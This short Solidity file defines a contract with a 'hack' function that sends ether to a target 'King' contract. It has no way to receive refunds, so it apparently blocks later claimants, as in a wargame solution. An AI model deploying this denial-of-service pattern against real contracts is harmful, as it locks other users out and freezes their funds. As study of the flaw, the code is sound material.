// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingForce {
    
    function hack(address payable _king) public payable {
        bool success;
        (success, ) = _king.call{value:msg.value}("");
        require(success, "Failed to send value!");
    }
}